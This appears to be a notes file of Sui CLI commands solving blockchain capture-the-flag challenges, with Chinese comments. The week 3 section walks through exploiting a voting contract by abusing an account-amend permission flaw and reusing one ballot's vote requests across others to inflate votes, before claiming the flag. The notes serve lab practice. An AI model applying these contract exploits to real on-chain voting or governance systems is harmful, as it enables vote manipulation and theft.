```
solve chapter 1
sui client call --package 0x6c70276957065426b085f5169dd7b2a9026d40e3ba4739e315130a63eaf0cb31 --module solve --function solve_get_flag
```

```
solve week1
sui client call --package 0xc8f1ca75340cf59f1bf99944ab3077c533715d323aaec44ab54ad67dbf5e4608 --module solve --function solve_get_flag --args 0x7406fb0517cd9633fced52ea2f7e47714ffc7c077760d2b3c19f82566135df97 "0x8"
```

```
solve week2

# 查看部署交易详情
sui client tx-block CFPqgewN9ANDfk7YLqLLmqDLrRAhrBAoWqrhiunTEvr7

sui client ptb \
  --move-call "0xc4d384fd38b7b9531e354af9f10aab43f8d6b45a6746d1970479bdfe6026f764::challenge::create_challenge" \
  "@0xf55adea3c91dd6d9ddb667950bda06d0403fc9deb71329b404361d3663d68221" \
  "@0xfb098f7084595171842aaf01f11c0b80bde3ac6ce64abeea793dd73a732cad21" \
  "@0xa0b802456712f35322d6ef8dd97a12043cca9807ef559a699f923957d48a1e43" \
  --assign challenge \
  --transfer-objects "[challenge]" \
  "@0x6ce51d45907024892556374dbf41bfdf5f3de5d5c4dcdb025334e5c4e7d54aa1"


sui client call \
  --package 0x13d1aa830bbf70cb3b22d2db13fc83c6d8f12af635815cc24d9617639ea2d55a \
  --module solve \
  --function exploit \
  --args 0x4c9de8eb1095dc7ae13279ccf19fc3e509da3c545df2d57bdb62aec8da3960b9 \
  --gas-budget 100000000

# 验证挑战解决
sui client call \
  --package 0xc4d384fd38b7b9531e354af9f10aab43f8d6b45a6746d1970479bdfe6026f764 \
  --module challenge \
  --function is_solved \
  --args 0x4c9de8eb1095dc7ae13279ccf19fc3e509da3c545df2d57bdb62aec8da3960b9 \
  --gas-budget 10000000

# 获取Flag
sui client call \
  --package 0xc4d384fd38b7b9531e354af9f10aab43f8d6b45a6746d1970479bdfe6026f764 \
  --module challenge \
  --function get_flag \
  --args 0x4c9de8eb1095dc7ae13279ccf19fc3e509da3c545df2d57bdb62aec8da3960b9 \
  "e5f6aace-4673-4c36-b862-eb8c2af14c34" \
  --gas-budget 10000000
```

```
solve week3

https://learnblockchain.cn/article/17734

你的 GitHub ID：dc4125d1-920a-415a-ab19-698fae372595

Package ID: 0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e

部署交易哈希: GVpYeRYpvFsPzZi9pypHRgutcTkmd2hHC5SD6Z5vcdoA

# 查看部署交易详情
sui client tx-block GVpYeRYpvFsPzZi9pypHRgutcTkmd2hHC5SD6Z5vcdoA

# Briber
0x58b57fd7429894d59d92580388caf1ff268dc420020b12d414f3ec4aa82faaa4

# 创建候选人（共享对象）
sui client call --package 0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e --module candidate --function register --gas-budget 10000000
# 获得候选人ID: 0x12c7e985074e28aeca2699ec0cd0eb98b9b3af9f6e650c2576d375932b0d2c65

# 创建第一个ballot（目标ballot）
sui client call --package 0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e --module ballot --function get_ballot --gas-budget 10000000
# 获得Ballot1 ID: 0x16b672b0c1601088c12f56bcc853b932b548216654608305ced96becde55ad99

# 创建第二个ballot
sui client call --package 0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e --module ballot --function get_ballot --gas-budget 10000000
# 获得Ballot2 ID: 0x2745918c5181a4939e28918314576c5242db4731b779e54856cb4637e47dcc7f

# 创建第三个ballot
sui client call --package 0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e --module ballot --function get_ballot --gas-budget 10000000
# 获得Ballot3 ID: 0x9940ae5c3437b985579920e1c5927a1b13338caa2464ca5bf9098bf8be07f278


第一次攻击：权限漏洞利用 + 正常投票
sui client ptb \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::candidate::amend_account" \
    "@0x12c7e985074e28aeca2699ec0cd0eb98b9b3af9f6e650c2576d375932b0d2c65" \
    "@0x0000000000000000000000000000000000000000000000000000000000000bad" \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::ballot::request_vote" \
    "@0x16b672b0c1601088c12f56bcc853b932b548216654608305ced96becde55ad99" --assign request1 \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::candidate::vote" \
    "@0x12c7e985074e28aeca2699ec0cd0eb98b9b3af9f6e650c2576d375932b0d2c65" request1 10 \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::ballot::finish_voting" \
    "@0x16b672b0c1601088c12f56bcc853b932b548216654608305ced96becde55ad99" request1 \
  --gas-budget 50000000
# 交易哈希: SASyxk2CRCDJpQ9aGn44s6cA7vhoiBjvFqCpf4wVX7m


第二次攻击：跨Ballot投票
sui client ptb \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::ballot::request_vote" \
    "@0x2745918c5181a4939e28918314576c5242db4731b779e54856cb4637e47dcc7f" --assign request2 \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::candidate::vote" \
    "@0x12c7e985074e28aeca2699ec0cd0eb98b9b3af9f6e650c2576d375932b0d2c65" request2 10 \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::ballot::finish_voting" \
    "@0x16b672b0c1601088c12f56bcc853b932b548216654608305ced96becde55ad99" request2 \
  --gas-budget 50000000
# 交易哈希: CPmk8QXNHpbkeBtRYkcNr5MGuW9rG1UYYdeTKsh854HE



第三次攻击：跨Ballot投票
sui client ptb \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::ballot::request_vote" \
    "@0x9940ae5c3437b985579920e1c5927a1b13338caa2464ca5bf9098bf8be07f278" --assign request3 \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::candidate::vote" \
    "@0x12c7e985074e28aeca2699ec0cd0eb98b9b3af9f6e650c2576d375932b0d2c65" request3 10 \
  --move-call "0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e::ballot::finish_voting" \
    "@0x16b672b0c1601088c12f56bcc853b932b548216654608305ced96becde55ad99" request3 \
  --gas-budget 50000000
# 交易哈希: JAdjvs2CCc6NmdgRtB6PQ9J9zQuXWt59quGANAzhRftA


第四步：获取Flag
sui client call \
  --package 0x99a9359f1301771f768fbdf24ef3cde430b4e54986a583601e1ba9afc0f3021e \
  --module briber --function get_flag \
  --args 0x58b57fd7429894d59d92580388caf1ff268dc420020b12d414f3ec4aa82faaa4 \
         0x16b672b0c1601088c12f56bcc853b932b548216654608305ced96becde55ad99 \
         "dc4125d1-920a-415a-ab19-698fae372595" \
  --gas-budget 10000000
# 交易哈希: 9spWeV7QgpKAgvykqeojPcTwR99cQApg2BAjAk6dNXky



```